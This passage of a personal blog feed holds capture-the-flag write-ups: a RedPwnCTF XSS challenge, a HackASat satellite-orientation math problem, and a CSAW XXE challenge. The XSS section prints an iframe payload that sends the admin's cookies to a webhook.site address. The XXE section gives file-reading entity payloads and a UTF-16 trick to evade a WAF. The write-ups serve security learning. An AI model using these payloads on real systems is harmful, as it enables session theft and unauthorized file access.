<p>Clicking on the secret fact presents the flag.</p>

    <img src="/images/REDPWN2020_PandaFactsFlag.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<h3 id="static-static-hosting">Static-static-hosting</h3>
<ul>
<li>points: 434</li>
</ul>
<p>Same idea as the problem &ldquo;Static-Pastebin&rdquo;: try and put an xss attack in the site. However, they filter <code>&lt;script&gt;</code> tags.</p>
<pre><code>function sanitize(element) {
    const attributes = element.getAttributeNames();
    for (let i = 0; i &lt; attributes.length; i++) {
        // Let people add images and styles
        if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) {
            element.removeAttribute(attributes[i]);
        }
    }

    const children = element.children;
    for (let i = 0; i &lt; children.length; i++) {
        if (children[i].nodeName === 'SCRIPT') {
            element.removeChild(children[i]);
            i --;
        } else {
            sanitize(children[i]);
        }
    }
}
</code></pre><p>Tried to use my <code>&lt;img&gt;</code>-based payload from before but it didn&rsquo;t ping my server when I visited it, as I believe it removes the <code>onerror()</code> function.</p>
<p>However, there still exists different ways to inject an xss payload. As an example, an <code>&lt;iframe&gt;</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:alert(&#39;Hello&#39;)&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</code></pre></div><p>This prompts an alert. <code>&lt;iframe&gt;</code> elements can be used to smuggle our xss payload.</p>

    <img src="/images/REDPWN2020_StaticV2Alert.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>Use this payload to send a GET request to your server that steals admin cookies:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:document.location=&#39;https://webhook.site/31b4faf3-e6e6-44af-9d7d-196e18bcaed4?data=&#39;+document.cookie&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</code></pre></div><p>Report the created page to the admin. Wait for it to ping your server.</p>

    <img src="/images/REDPWN2020_StaticV2Flag.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<h2 id="summary">Summary</h2>
<p>The collection of problems I showcased here were good opportunities to reinforce my websploit skills! They all involved classic forms of attacks which is common to see in most, if not all, CTFs. I will soon discuss the more unique and creative problems I saw in RedPwnCTF 2020!</p>
<p>Jam</p>
]]></content>
        </item>
        
        <item>
            <title>2020 HackASat Quals</title>
            <link>https://jamvie.net/posts/2020/06/2020-hackasat-quals/</link>
            <pubDate>Wed, 03 Jun 2020 21:47:00 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/06/2020-hackasat-quals/</guid>
            <description>I participated in HackASat Quals with my team earlier in May. This was a unique CTF, as it had a category of astrodynamic mathematical problems that pertained to the geometry of earth-orbiting objects. I love math, so I actually quite enjoyed this category! 2 teammates and I collaborated together to solve a specific problem known as &amp;ldquo;I Like to Watch.&amp;rdquo; I also went through it myself and am going to discuss my solution to it.</description>
            <content type="html"><![CDATA[<p>I participated in <a href="https://www.hackasat.com/">HackASat Quals</a> with my team earlier in May. This was a unique CTF, as it had a category of astrodynamic mathematical problems that pertained to the geometry of earth-orbiting objects. I love math, so I actually quite enjoyed this category! 2 teammates and I collaborated together to solve a specific problem known as &ldquo;I Like to Watch.&rdquo; I also went through it myself and am going to discuss my solution to it.</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p>The challenge states that we must realign a satellite (simulated via Google Earth) to its exact position and orientation as it was reported at a specific time.</p>

    <img src="/images/HackASatDescription.jpg"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>Additionally, the challenge supplies us with a KML file - files tailored for Google Earth to communicate location data, with similarities to XML documents.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
<span style="color:#f92672">&lt;kml</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.opengis.net/kml/2.2&#34;</span><span style="color:#f92672">&gt;</span>
  <span style="color:#f92672">&lt;Folder&gt;</span>
    <span style="color:#f92672">&lt;name&gt;</span>HackASatCompetition<span style="color:#f92672">&lt;/name&gt;</span>
    <span style="color:#f92672">&lt;visibility&gt;</span>0<span style="color:#f92672">&lt;/visibility&gt;</span>
    <span style="color:#f92672">&lt;open&gt;</span>0<span style="color:#f92672">&lt;/open&gt;</span>
    <span style="color:#f92672">&lt;description&gt;</span>HackASatComp1<span style="color:#f92672">&lt;/description&gt;</span>
    <span style="color:#f92672">&lt;NetworkLink&gt;</span>
      <span style="color:#f92672">&lt;name&gt;</span>View Centered Placemark<span style="color:#f92672">&lt;/name&gt;</span>
      <span style="color:#f92672">&lt;visibility&gt;</span>0<span style="color:#f92672">&lt;/visibility&gt;</span>
      <span style="color:#f92672">&lt;open&gt;</span>0<span style="color:#f92672">&lt;/open&gt;</span>
      <span style="color:#f92672">&lt;description&gt;</span>This is where the satellite was located when we saw it.<span style="color:#f92672">&lt;/description&gt;</span>
      <span style="color:#f92672">&lt;refreshVisibility&gt;</span>0<span style="color:#f92672">&lt;/refreshVisibility&gt;</span>
      <span style="color:#f92672">&lt;flyToView&gt;</span>0<span style="color:#f92672">&lt;/flyToView&gt;</span>
      <span style="color:#f92672">&lt;LookAt</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;ID&#34;</span><span style="color:#f92672">&gt;</span>
        <span style="color:#75715e">&lt;!-- specific to LookAt --&gt;</span>
			<span style="color:#f92672">&lt;longitude&gt;</span>-FILL ME IN<span style="color:#f92672">&lt;/longitude&gt;</span>
			<span style="color:#f92672">&lt;latitude&gt;</span>FILL ME IN<span style="color:#f92672">&lt;/latitude&gt;</span>
			<span style="color:#f92672">&lt;altitude&gt;</span>FILL ME IN<span style="color:#f92672">&lt;/altitude&gt;</span>
			<span style="color:#f92672">&lt;heading&gt;</span>FILL ME IN<span style="color:#f92672">&lt;/heading&gt;</span>
			<span style="color:#f92672">&lt;tilt&gt;</span>FILL ME IN<span style="color:#f92672">&lt;/tilt&gt;</span>
			<span style="color:#f92672">&lt;range&gt;</span>FILL ME IN<span style="color:#f92672">&lt;/range&gt;</span>
			<span style="color:#f92672">&lt;gx:altitudeMode&gt;</span>relativeToSeaFloor<span style="color:#f92672">&lt;/gx:altitudeMode&gt;</span>
      <span style="color:#f92672">&lt;/LookAt&gt;</span>
      <span style="color:#f92672">&lt;Link&gt;</span>
        <span style="color:#f92672">&lt;href&gt;</span>http://18.191.77.141:31110/cgi-bin/HSCKML.py<span style="color:#f92672">&lt;/href&gt;</span>
        <span style="color:#f92672">&lt;refreshInterval&gt;</span>1<span style="color:#f92672">&lt;/refreshInterval&gt;</span>
        <span style="color:#f92672">&lt;viewRefreshMode&gt;</span>onStop<span style="color:#f92672">&lt;/viewRefreshMode&gt;</span>
        <span style="color:#f92672">&lt;viewRefreshTime&gt;</span>1<span style="color:#f92672">&lt;/viewRefreshTime&gt;</span>
        <span style="color:#f92672">&lt;viewFormat&gt;</span>BBOX=[bboxWest],[bboxSouth],[bboxEast],[bboxNorth];CAMERA=[lookatLon],[lookatLat],[lookatRange],[lookatTilt],[lookatHeading];VIEW=[horizFov],[vertFov],[horizPixels],[vertPixels],[terrainEnabled]<span style="color:#f92672">&lt;/viewFormat&gt;</span>
      <span style="color:#f92672">&lt;/Link&gt;</span>
    <span style="color:#f92672">&lt;/NetworkLink&gt;</span>
  <span style="color:#f92672">&lt;/Folder&gt;</span>
<span style="color:#f92672">&lt;/kml&gt;</span>

</code></pre></div><p>From the netcat connection, the coordinates of the satellite are given to us in <a href="https://en.wikipedia.org/wiki/Two-line_element_set">TLE format</a>. I saved the TLE data in a text file (TLE.txt) for later use. In order to draw out meaningful values from it, you need to parse it. While you can do so manually, I opted to use a script that utilizes <a href="https://pyorbital.readthedocs.io/en/latest/#">pyOrbital</a>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pyorbital.orbital <span style="color:#f92672">import</span> Orbital
<span style="color:#f92672">from</span> pyorbital <span style="color:#f92672">import</span> tlefile
<span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> datetime

tle_object_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ISS (ZARYA)&#34;</span>
sat <span style="color:#f92672">=</span> tlefile<span style="color:#f92672">.</span>read(tle_object_name, <span style="color:#e6db74">&#39;TLE.txt&#39;</span>)

<span style="color:#75715e">##8:53:03 pm on March 26, 2020 according to the netcat information</span>
time <span style="color:#f92672">=</span> datetime(<span style="color:#ae81ff">2020</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">3</span>)

satLon, satLat, satAlt <span style="color:#f92672">=</span> sat<span style="color:#f92672">.</span>get_lonlatalt(time)

<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Satellite Lat{}, Lon{}, Alt{}&#34;</span><span style="color:#f92672">.</span>format(satLat, satLon, satAlt)

<span style="color:#f92672">...</span>

</code></pre></div><pre><code>Satellite Lat{36.946888888888886}, Lon{-80.94308333333333}, Alt{419158.46875}
</code></pre><p>Parsing the TLE format gives us the satellite&rsquo;s location in latitude and longitude, alongside several other key info. The challenge&rsquo;s description asks us to arrange the satellite&rsquo;s (Google Earth) camera in the exact same position as it was, facing the Washington Monument, with very little room for error. We must essentially recreate the orientation of the satellite at its given position at the given time. Since we&rsquo;re using Google Earth, the given KML file will help us manipulate the orientation of the virtual camera.</p>
<p>In the KML file, we are given a specific tag known as <code>&lt;LookAt&gt;</code>. Some research into the KML documentation reveals that the <code>&lt;LookAt&gt;</code> tag changes the object that the camera is focused on. It can function similarly to another attribute known as <code>&lt;Camera&gt;</code>, which changes the actual camera position. Both tags can be used to try and position our satellite to perfectly align to the Washington Monument, but the <code>&lt;Camera&gt;</code> tag deals with less sub-attributes rather than <code>&lt;Lookat&gt;</code>. In this solution, I opted to use the <code>&lt;Camera&gt;</code> tag, however, the initial solve my team did the <code>&lt;LookAt&gt;</code> tag.</p>
<h2 id="the-camera-tag">The Camera Tag</h2>
<p><code>&lt;Camera&gt;</code> has 7 sub-attributes(excluding altitudeMode), of which we only need to focus on all but the last:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;Camera</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;ID&#34;</span><span style="color:#f92672">&gt;</span>    
  <span style="color:#f92672">&lt;longitude&gt;</span>0<span style="color:#f92672">&lt;/longitude&gt;</span>          <span style="color:#75715e">&lt;!-- kml:angle180 --&gt;</span>     
  <span style="color:#f92672">&lt;latitude&gt;</span>0<span style="color:#f92672">&lt;/latitude&gt;</span>            <span style="color:#75715e">&lt;!-- kml:angle90 --&gt;</span>    
  <span style="color:#f92672">&lt;altitude&gt;</span>0<span style="color:#f92672">&lt;/altitude&gt;</span>            <span style="color:#75715e">&lt;!-- double --&gt;</span>    
  <span style="color:#f92672">&lt;heading&gt;</span>0<span style="color:#f92672">&lt;/heading&gt;</span>              <span style="color:#75715e">&lt;!-- kml:angle360 --&gt;</span>    
  <span style="color:#f92672">&lt;tilt&gt;</span>0<span style="color:#f92672">&lt;/tilt&gt;</span>                    <span style="color:#75715e">&lt;!-- kml:anglepos180 --&gt;</span>    
  <span style="color:#f92672">&lt;roll&gt;</span>0<span style="color:#f92672">&lt;/roll&gt;</span>                    <span style="color:#75715e">&lt;!-- kml:angle180 --&gt;</span>    
  <span style="color:#f92672">&lt;altitudeMode&gt;</span>clampToGround<span style="color:#f92672">&lt;/altitudeMode&gt;</span>
       <span style="color:#75715e">&lt;!-- kml:altitudeModeEnum: relativeToGround, clampToGround, or absolute --&gt;</span>  
       <span style="color:#75715e">&lt;!-- or, gx:altitudeMode can be substituted: clampToSeaFloor, relativeToSeaFloor --&gt;</span>
<span style="color:#f92672">&lt;/Camera&gt;</span> 
</code></pre></div><p>The first three (longitude, latitude and altitude) we can parse from the TLE data from above. However, for heading and tilt - we would need to do some math.</p>
<p>The heading, also known as the azimuth direction, of an earth-orbiting object is the angle from it&rsquo;s absolute ground-level position to the north pole. It is a method to orient oneself to face the object relative to a standardized direction (North/South) on earth. The azimuth is an angle between 0-360 degrees.</p>
<p>We want to determine the azimuth of our satellite at 10:53pm on March 20, 2020. We can use the methods within pyOrbital to calculate the elevation and heading of our satellite. While, again, this can be done manually, keep in mind that we are computing an object relative to Earth and thus must account for the curvature of our planet - we need to acknowledge our geometry being non-Euclidean. This serves several problems for manual computation or utilizing a machine to calculate equations which do not take this into account.</p>
<p>In my computations, I wanted to calculate the azimuth of the satellite relative to an observer - as in, a target on the ground looking at the satellite. In this case, the challenge wants us to focus the satellite camera on the Washington Monument, so we will have the landmark be our observer.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
<span style="color:#f92672">...</span>
<span style="color:#75715e">#Part 2 of our script.</span>

<span style="color:#75715e">#Washington Monument lon, lat and alt values.</span>
WaLon <span style="color:#f92672">=</span> <span style="color:#ae81ff">38.8895</span>
WaLat <span style="color:#f92672">=</span> <span style="color:#ae81ff">77.0353</span>
WaAlt <span style="color:#f92672">=</span> <span style="color:#ae81ff">169</span>

azi <span style="color:#f92672">=</span> sat<span style="color:#f92672">.</span>get_observer_look(utc_time<span style="color:#f92672">=</span>time, lon<span style="color:#f92672">=</span>WaLon lat<span style="color:#f92672">=</span>WaLat, alt<span style="color:#f92672">=</span>WaAlt)
	<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&#34;</span>)
	<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Azimuth:	&#34;</span>, azi)
</code></pre></div><p>The tilt is the rotation of the satellite on the X-axis. Because the satellite would theoretically be looking at an overhead angle towards the monument, I did some manual guessing and checking manipulation to see if I could get the correct value. I&rsquo;m sure theres a better, more efficient way of doing this, but I digress :P.</p>
<p>Now, when we plug in all our values into the sample KML file they provided for us, we should appear at the same location the satellite was at, with the camera turned towards the Washington Monument in the exact same orientation and positioning as the satellite was at the given time.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
<span style="color:#f92672">&lt;kml</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.opengis.net/kml/2.2&#34;</span><span style="color:#f92672">&gt;</span>
  <span style="color:#f92672">&lt;Folder&gt;</span>
    <span style="color:#f92672">&lt;name&gt;</span>HackASatCompetition<span style="color:#f92672">&lt;/name&gt;</span>
    <span style="color:#f92672">&lt;visibility&gt;</span>0<span style="color:#f92672">&lt;/visibility&gt;</span>
    <span style="color:#f92672">&lt;open&gt;</span>0<span style="color:#f92672">&lt;/open&gt;</span>
    <span style="color:#f92672">&lt;description&gt;</span>HackASatComp1<span style="color:#f92672">&lt;/description&gt;</span>
    <span style="color:#f92672">&lt;NetworkLink&gt;</span>
      <span style="color:#f92672">&lt;name&gt;</span>View Centered Placemark<span style="color:#f92672">&lt;/name&gt;</span>
      <span style="color:#f92672">&lt;visibility&gt;</span>0<span style="color:#f92672">&lt;/visibility&gt;</span>
      <span style="color:#f92672">&lt;open&gt;</span>0<span style="color:#f92672">&lt;/open&gt;</span>
      <span style="color:#f92672">&lt;description&gt;</span>This is where the satellite was located when we saw it.<span style="color:#f92672">&lt;/description&gt;</span>
      <span style="color:#f92672">&lt;refreshVisibility&gt;</span>0<span style="color:#f92672">&lt;/refreshVisibility&gt;</span>
      <span style="color:#f92672">&lt;flyToView&gt;</span>0<span style="color:#f92672">&lt;/flyToView&gt;</span>
      <span style="color:#f92672">&lt;Camera</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;ID&#34;</span><span style="color:#f92672">&gt;</span>
        <span style="color:#75715e">&lt;!-- We input our values here --&gt;</span>
			<span style="color:#f92672">&lt;longitude&gt;</span>-80.94308333333333<span style="color:#f92672">&lt;/longitude&gt;</span>
			<span style="color:#f92672">&lt;latitude&gt;</span>36.946888888888886<span style="color:#f92672">&lt;/latitude&gt;</span>
			<span style="color:#f92672">&lt;altitude&gt;</span>19158.46875<span style="color:#f92672">&lt;/altitude&gt;</span>
			<span style="color:#f92672">&lt;heading&gt;</span>57.889<span style="color:#f92672">&lt;/heading&gt;</span>
			<span style="color:#f92672">&lt;tilt&gt;</span>44.886<span style="color:#f92672">&lt;/tilt&gt;</span>
			<span style="color:#f92672">&lt;gx:altitudeMode&gt;</span>relativeToSeaFloor<span style="color:#f92672">&lt;/gx:altitudeMode&gt;</span>
      <span style="color:#f92672">&lt;/Camera&gt;</span>
      <span style="color:#f92672">&lt;Link&gt;</span>
        <span style="color:#f92672">&lt;href&gt;</span>http://18.191.77.141:31110/cgi-bin/HSCKML.py<span style="color:#f92672">&lt;/href&gt;</span>
        <span style="color:#f92672">&lt;refreshInterval&gt;</span>1<span style="color:#f92672">&lt;/refreshInterval&gt;</span>
        <span style="color:#f92672">&lt;viewRefreshMode&gt;</span>onStop<span style="color:#f92672">&lt;/viewRefreshMode&gt;</span>
        <span style="color:#f92672">&lt;viewRefreshTime&gt;</span>1<span style="color:#f92672">&lt;/viewRefreshTime&gt;</span>
        <span style="color:#f92672">&lt;viewFormat&gt;</span>BBOX=[bboxWest],[bboxSouth],[bboxEast],[bboxNorth];CAMERA=[lookatLon],[lookatLat],[lookatRange],[lookatTilt],[lookatHeading];VIEW=[horizFov],[vertFov],[horizPixels],[vertPixels],[terrainEnabled]<span style="color:#f92672">&lt;/viewFormat&gt;</span>
      <span style="color:#f92672">&lt;/Link&gt;</span>
    <span style="color:#f92672">&lt;/NetworkLink&gt;</span>
  <span style="color:#f92672">&lt;/Folder&gt;</span>
<span style="color:#f92672">&lt;/kml&gt;</span>

</code></pre></div><p>Doing so in Google Earth, the link that we specified in the KML file refers to the server to check our values against theres, and we are rewarded with a (randomized) flag once we have aligned the satellite back to its exact position on March 20 :)</p>

    <img src="/images/GoogleEarthPic.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>This was less a &ldquo;hacking&rdquo; challenge and more a mathematics one. I&rsquo;m always down to learn more about the world of math, and hopefully I can expand my blog to talk about the unique things I come across in the world of complex mathematics!</p>
<p>Jam</p>
]]></content>
        </item>
        
        <item>
            <title>CSAW 2019: Unagi</title>
            <link>https://jamvie.net/posts/2020/05/csaw-2019-unagi/</link>
            <pubDate>Thu, 21 May 2020 01:22:16 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/05/csaw-2019-unagi/</guid>
            <description>Back in 2019 I really got into CTFs as a matter of honing my security skills. They were fun to do and enriched my knowledge of cybersecurity - so I got into it pretty quickly.
This was among the first of the challenges I did while under my team, Maple Bacon. At the time, I had plenty experience with SQL injections and XSS attacks, but not nearly enough experience with another common vulnerability: XXE attacks.</description>
            <content type="html"><![CDATA[<p>Back in 2019 I really got into CTFs as a matter of honing my security skills. They were fun to do and enriched my knowledge of cybersecurity - so I got into it pretty quickly.</p>
<p>This was among the first of the challenges I did while under my team, Maple Bacon. At the time, I had plenty experience with SQL injections and XSS attacks, but not nearly enough experience with another common vulnerability: XXE attacks. CSAW 2019 sought to change that.</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p><em>Note: Unfortunately, I do not have screenshots as I partcipated in this CTF long before I realized I wanted to document my progress with them.</em></p>
<p>The challenge was called &ldquo;Unagi&rdquo;. Several options were shown: <code>home</code>, <code>users</code>, <code>about</code> and <code>upload</code>. <code>about</code> simply said <code>flag is at /flag.txt, come get it</code></p>
<p>It was a website with users Alice and Bob displayed, with their emails, group, and intro. There was an <code>upload</code> endpoint that allowed you to upload XML documents to create a new user. And they also had a sample xml file, how nice!</p>
<pre><code>name: Alice
email: alice@fakesite.com
group: CSAW2019
intro: Alice is cool

name: Bob
email: bob@fakesite.com
group: CSAW2019
intro: Bob is cool too
</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#39;1.0&#39;?&gt;</span>
<span style="color:#f92672">&lt;users&gt;</span>
    <span style="color:#f92672">&lt;user&gt;</span>
        <span style="color:#f92672">&lt;username&gt;</span>alice<span style="color:#f92672">&lt;/username&gt;</span>
        <span style="color:#f92672">&lt;password&gt;</span>passwd1<span style="color:#f92672">&lt;/password&gt;</span>
        <span style="color:#f92672">&lt;name&gt;</span>Alice<span style="color:#f92672">&lt;/name&gt;</span>
        <span style="color:#f92672">&lt;email&gt;</span>alice@fakesite.com<span style="color:#f92672">&lt;/email&gt;</span>
        <span style="color:#f92672">&lt;group&gt;</span>CSAW2019<span style="color:#f92672">&lt;/group&gt;</span>
    <span style="color:#f92672">&lt;/user&gt;</span>
    <span style="color:#f92672">&lt;user&gt;</span>
        <span style="color:#f92672">&lt;username&gt;</span>bob<span style="color:#f92672">&lt;/username&gt;</span>
        <span style="color:#f92672">&lt;password&gt;</span>passwd2<span style="color:#f92672">&lt;/password&gt;</span>
        <span style="color:#f92672">&lt;name&gt;</span> Bob<span style="color:#f92672">&lt;/name&gt;</span>
        <span style="color:#f92672">&lt;email&gt;</span>bob@fakesite.com<span style="color:#f92672">&lt;/email&gt;</span>
        <span style="color:#f92672">&lt;group&gt;</span>CSAW2019<span style="color:#f92672">&lt;/group&gt;</span>
    <span style="color:#f92672">&lt;/user&gt;</span>
<span style="color:#f92672">&lt;/users&gt;</span>
</code></pre></div><p>This challenge has taught me one thing: where there is XML, there is XXE injection. Researching for hours about XML vulnerabilities all point to XXE injections being <strong>the</strong> attack to do, so I crafted a pretty classic XXE payload and put it in my file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
<span style="color:#75715e">&lt;!DOCTYPE foo [
</span><span style="color:#75715e">	&lt;!ENTITY xxe SYSTEM &#34;file:////flag.txt&#34; &gt;</span>
]&gt;    

<span style="color:#f92672">&lt;users&gt;</span>
    <span style="color:#f92672">&lt;user&gt;</span>
        <span style="color:#f92672">&lt;username&gt;</span>Jam<span style="color:#f92672">&lt;/username&gt;</span>
        <span style="color:#f92672">&lt;password&gt;</span>wordpass<span style="color:#f92672">&lt;/password&gt;</span>
        <span style="color:#f92672">&lt;name&gt;</span>Jam<span style="color:#f92672">&lt;/name&gt;</span>
        <span style="color:#f92672">&lt;email&gt;</span>jam@jelly.com<span style="color:#f92672">&lt;/email&gt;</span>
        <span style="color:#f92672">&lt;group&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/group&gt;</span>
    <span style="color:#f92672">&lt;/user&gt;</span>
<span style="color:#f92672">&lt;/users&gt;</span>
</code></pre></div><p>But the WAF will reject the file. I sort of just&hellip; aimlessly searched the internet for a fix, dismayed to find a bunch of php workarounds, as this was during a time where I definitely wasn&rsquo;t confident with my skills in php, and so I sort of stagnated at this point&hellip;</p>
<p>&hellip;Until I got curious about the encoding declaration. Standardly, encodings are UTF-8 around the board, but encoding UTF-16 exists - and what would happen if I changed the XML encoding from UTF-8 to UTF-16? This led me down to researching about using <a href="https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0/">different encodings to bypass WAF filters</a>:</p>
<blockquote>
<p>An XML document can be encoded not only in UTF-8, but also in UTF-16 (two variants — BE and LE), in UTF-32 (four variants — BE, LE, 2143, 3412), and in EBCDIC&hellip;</p>
</blockquote>
<blockquote>
<p>&hellip;Exotic encodings may also be used to bypass diligent WAFs as they are not always able to process all the encodings listed above. For instance, the libxml2 parser only supports one type of UTF-32 — UTF-32BE, specifically without BOM.</p>
</blockquote>
<p>For this issue in particular, UTF-8 and UTF-16 differ in their ways of encoding a sequence of chars. UTF-8&rsquo;s character encodings are 1-4 bytes, while UTF-16&rsquo;s are 2-4. What this challenge&rsquo;s WAF does is look at the byte encoding of a character and match it with whatever blacklist it has. But naturally, UTF-8&rsquo;s character encodings are going to be vastly different from UTF-16&rsquo;s, since there is at least 1 byte of a difference. So when the WAF looks at UTF-16 encodings, it won&rsquo;t be able to detect the malicious characters that is differently encoded in 2 bytes, and assumes the file is clean.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16BE&#34;?&gt;</span>
<span style="color:#75715e">&lt;!DOCTYPE foo [
</span><span style="color:#75715e">	&lt;!ENTITY xxe SYSTEM &#34;file:////flag.txt&#34; &gt;</span>
]&gt;    

<span style="color:#f92672">&lt;users&gt;</span>
    <span style="color:#f92672">&lt;user&gt;</span>
        <span style="color:#f92672">&lt;username&gt;</span>Jam<span style="color:#f92672">&lt;/username&gt;</span>
        <span style="color:#f92672">&lt;password&gt;</span>wordpass<span style="color:#f92672">&lt;/password&gt;</span>
        <span style="color:#f92672">&lt;name&gt;</span>Jam<span style="color:#f92672">&lt;/name&gt;</span>
        <span style="color:#f92672">&lt;email&gt;</span>jam@jelly.com<span style="color:#f92672">&lt;/email&gt;</span>
        <span style="color:#f92672">&lt;group&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/group&gt;</span>
    <span style="color:#f92672">&lt;/user&gt;</span>
<span style="color:#f92672">&lt;/users&gt;</span>
</code></pre></div><p>UTF-16 encoding does bypass the WAF but when the flag.txt file is loaded&hellip;</p>
<pre><code>name: Jam
email: jam@jelly.com
group: AAAAAAAAAAAAAAAAAAAA
</code></pre><p>It&rsquo;s cut off, probably cause the &ldquo;group&rdquo; field has a character limit. But interestingly enough, the xml sample file doesn&rsquo;t specify a field we saw before - <code>intro</code>. Could we just put our xxe attack in there?</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16BE&#34;?&gt;</span>
<span style="color:#75715e">&lt;!DOCTYPE foo [
</span><span style="color:#75715e">	&lt;!ENTITY xxe SYSTEM &#34;file:////flag.txt&#34; &gt;</span>
]&gt;    

<span style="color:#f92672">&lt;users&gt;</span>
    <span style="color:#f92672">&lt;user&gt;</span>
        <span style="color:#f92672">&lt;username&gt;</span>Jam<span style="color:#f92672">&lt;/username&gt;</span>
        <span style="color:#f92672">&lt;password&gt;</span>wordpass<span style="color:#f92672">&lt;/password&gt;</span>
        <span style="color:#f92672">&lt;name&gt;</span>Jam<span style="color:#f92672">&lt;/name&gt;</span>
        <span style="color:#f92672">&lt;email&gt;</span>jam@jelly.com<span style="color:#f92672">&lt;/email&gt;</span>
        <span style="color:#f92672">&lt;group&gt;</span>Fruit Preservatives<span style="color:#f92672">&lt;/group&gt;</span>
        <span style="color:#f92672">&lt;intro&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/intro&gt;</span>
    <span style="color:#f92672">&lt;/user&gt;</span>
<span style="color:#f92672">&lt;/users&gt;</span>
</code></pre></div><p>It works!</p>
<pre><code>name: Jam
email: jam@jelly.com
group: Fruit Preservatives
intro: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAflag{n0w_i'm_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</code></pre><hr>
<p>Looking back at CSAW 2019 now, it&rsquo;s almost obvious that the attack vector here was an XXE. Of course, being young and somewhat new to the collective CTF scene I wouldn&rsquo;t have figured this out from the get-go. It feels nice to know that I have grown and evolved as a CTF hacker, and I will continue to do so. While I got more serious early this year, each CTF I participate in teaches me something new, and I will continue to grow and evolve as I participate in more CTFs. Hopefully if anyone reads this and feels uncertain about how much they don&rsquo;t know, spin it around and see it as an oppurtunity of how much you can learn :) Anyway, this was a quick writeup I did based on my year-old notes on this challenge, so I apologize for the lack of screenshots and otherwise simple presentation of it. This coming weekend, I will be participating in a few different CTFs, so expect more writeups to come soon!</p>
<p>Jam</p>
<hr>
<p>References</p>
<p>Cover Image: <a href="https://www.pexels.com/@isabella-mendes-107313">Isabella Mendes</a> on Pexels</p>
]]></content>
        </item>
        
        <item>
            <title>DE1ctf 2020: Hard_Pentest_1 and Animal Crossing</title>
            <link>https://jamvie.net/posts/2020/05/de1ctf-2020-hard_pentest_1-and-animal-crossing/</link>
            <pubDate>Thu, 07 May 2020 15:20:38 -0600</pubDate>
            
